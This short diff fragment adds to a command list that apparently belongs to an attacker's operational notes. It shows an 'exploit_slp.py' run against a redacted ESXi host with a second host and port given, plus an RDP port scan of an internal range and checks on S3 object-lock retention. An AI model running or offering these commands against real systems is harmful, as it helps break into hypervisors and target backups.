@@ -65,12 +65,15 @@ Commands:
 
 
         * nohup python main_esxi.py
+        * python exploit_slp.py -u <REDACTED>:443 -s <REDACTED>:5555 
 
         * aws s3 ls --endpoint-url https://REDACTED --profile pnap
 
         * Check-ObjectLock-Retention.ps1
 
         * ./pscan -a 10.168.27.0-10.168.27.255 -p 3389 -t 10 -l 5 -o out
+
+      
 
 
 ESXI Commands:
